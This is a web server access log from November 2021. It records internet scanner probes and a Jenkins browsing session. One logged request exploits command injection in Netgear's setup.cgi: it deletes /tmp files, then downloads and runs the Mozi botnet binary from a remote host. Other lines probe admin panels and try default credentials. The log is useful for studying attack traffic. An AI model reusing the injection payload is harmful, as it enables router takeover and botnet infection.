78.128.112.14 - - [28/Nov/2021:00:24:46 +0000] "-" 400 -
163.179.170.84 - - [28/Nov/2021:00:46:55 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://163.179.170.84:38678/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1018
209.17.96.170 - - [28/Nov/2021:01:18:56 +0000] "-" 400 -
202.51.180.42 - - [28/Nov/2021:01:28:08 +0000] "GET / HTTP/1.1" 200 11283
46.174.191.30 - - [28/Nov/2021:03:03:13 +0000] "GET / HTTP/1.0" 200 11236
184.105.247.194 - - [28/Nov/2021:03:10:25 +0000] "GET / HTTP/1.1" 200 11283
192.241.213.219 - - [28/Nov/2021:03:30:16 +0000] "GET /hudson HTTP/1.1" 404 1012
43.131.22.118 - - [28/Nov/2021:03:36:11 +0000] "GET / HTTP/1.1" 200 11283
209.17.96.2 - - [28/Nov/2021:03:40:14 +0000] "GET / HTTP/1.1" 200 11236
180.149.125.165 - - [28/Nov/2021:03:40:14 +0000] "GET / HTTP/1.1" 200 11283
194.176.97.160 - - [28/Nov/2021:03:50:57 +0000] "GET / HTTP/1.1" 200 11283
181.193.81.190 - - [28/Nov/2021:04:10:07 +0000] "GET / HTTP/1.1" 200 11283
209.17.96.18 - - [28/Nov/2021:04:14:17 +0000] "GET / HTTP/1.0" 200 11236
205.185.118.227 - - [28/Nov/2021:05:13:31 +0000] "GET /manager/html HTTP/1.1" 403 3438
101.0.55.51 - - [28/Nov/2021:05:48:46 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 1046
185.180.143.8 - - [28/Nov/2021:05:55:15 +0000] "GET / HTTP/1.1" 200 11283
209.141.45.121 - - [28/Nov/2021:06:39:04 +0000] "GET /manager/html HTTP/1.1" 403 3438
167.71.102.181 - - [28/Nov/2021:06:55:12 +0000] "-" 400 -
54.67.102.75 - - [28/Nov/2021:06:56:37 +0000] "GET / HTTP/1.1" 200 11283
49.37.169.198 - - [28/Nov/2021:07:28:21 +0000] "GET /jenkins/ HTTP/1.1" 403 577
49.37.169.198 - - [28/Nov/2021:07:28:22 +0000] "GET /jenkins/login?from=%2Fjenkins%2F HTTP/1.1" 200 894
49.37.169.198 - - [28/Nov/2021:07:28:31 +0000] "POST /jenkins/j_spring_security_check HTTP/1.1" 302 -
49.37.169.198 - - [28/Nov/2021:07:28:32 +0000] "GET /jenkins/ HTTP/1.1" 200 5328
49.37.169.198 - - [28/Nov/2021:07:28:38 +0000] "POST /jenkins/ajaxBuildQueue HTTP/1.1" 200 405
49.37.169.198 - - [28/Nov/2021:07:28:38 +0000] "POST /jenkins/ajaxExecutors HTTP/1.1" 200 428
49.37.169.198 - - [28/Nov/2021:07:28:41 +0000] "GET /jenkins/view/all/newJob HTTP/1.1" 200 2701
49.37.169.198 - - [28/Nov/2021:07:28:41 +0000] "GET /jenkins/static/747a0610/jsbundles/add-item.js HTTP/1.1" 200 2667
49.37.169.198 - - [28/Nov/2021:07:28:41 +0000] "GET /jenkins/static/747a0610/jsbundles/add-item.css HTTP/1.1" 200 5130
49.37.169.198 - - [28/Nov/2021:07:28:42 +0000] "GET /jenkins/view/all/itemCategories?depth=3&iconStyle=icon-xlg HTTP/1.1" 200 1157
49.37.169.198 - - [28/Nov/2021:07:28:42 +0000] "GET /jenkins/static/747a0610/images/48x48/freestyleproject.png HTTP/1.1" 200 2257
49.37.169.198 - - [28/Nov/2021:07:28:42 +0000] "GET /jenkins/plugin/workflow-job/images/48x48/pipelinejob.png HTTP/1.1" 200 2367
49.37.169.198 - - [28/Nov/2021:07:28:42 +0000] "GET /jenkins/plugin/matrix-project/images/48x48/matrixproject.png HTTP/1.1" 200 2438
49.37.169.198 - - [28/Nov/2021:07:28:42 +0000] "GET /jenkins/static/747a0610/plugin/cloudbees-folder/images/48x48/folder.png HTTP/1.1" 200 1873
49.37.169.198 - - [28/Nov/2021:07:28:42 +0000] "GET /jenkins/static/747a0610/plugin/branch-api/images/48x48/organization-folder.png HTTP/1.1" 200 3674
49.37.169.198 - - [28/Nov/2021:07:28:42 +0000] "GET /jenkins/static/747a0610/plugin/workflow-multibranch/images/48x48/pipelinemultibranchproject.png HTTP/1.1" 200 3421
49.37.169.198 - - [28/Nov/2021:07:28:47 +0000] "GET /jenkins/ HTTP/1.1" 200 3551
49.37.169.198 - - [28/Nov/2021:07:28:52 +0000] "POST /jenkins/ajaxBuildQueue HTTP/1.1" 200 405
49.37.169.198 - - [28/Nov/2021:07:28:52 +0000] "POST /jenkins/ajaxExecutors HTTP/1.1" 200 428
49.37.169.198 - - [28/Nov/2021:07:28:53 +0000] "GET /jenkins/manage HTTP/1.1" 200 5234
49.37.169.198 - - [28/Nov/2021:07:28:53 +0000] "GET /jenkins/adjuncts/747a0610/hudson/diagnosis/ReverseProxySetupMonitor/resources.css HTTP/1.1" 200 64
49.37.169.198 - - [28/Nov/2021:07:28:53 +0000] "GET /jenkins/static/747a0610/css/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 6669
49.37.169.198 - - [28/Nov/2021:07:28:53 +0000] "GET /jenkins/adjuncts/747a0610/hudson/diagnosis/ReverseProxySetupMonitor/resources.js HTTP/1.1" 200 726
49.37.169.198 - - [28/Nov/2021:07:28:53 +0000] "GET /jenkins/static/747a0610/images/48x48/gear2.png HTTP/1.1" 200 3804
49.37.169.198 - - [28/Nov/2021:07:28:53 +0000] "GET /jenkins/static/747a0610/images/48x48/setting.png HTTP/1.1" 200 3368
49.37.169.198 - - [28/Nov/2021:07:28:54 +0000] "GET /jenkins/static/747a0610/images/48x48/plugin.png HTTP/1.1" 200 1859
49.37.169.198 - - [28/Nov/2021:07:28:54 +0000] "GET /jenkins/administrativeMonitor/jenkins.diagnostics.URICheckEncodingMonitor/checkURIEncoding?value=%E5%9F%B7%E4%BA%8B HTTP/1.1" 200 6
49.37.169.198 - - [28/Nov/2021:07:28:54 +0000] "GET /jenkins/static/747a0610/images/48x48/network.png HTTP/1.1" 200 3244
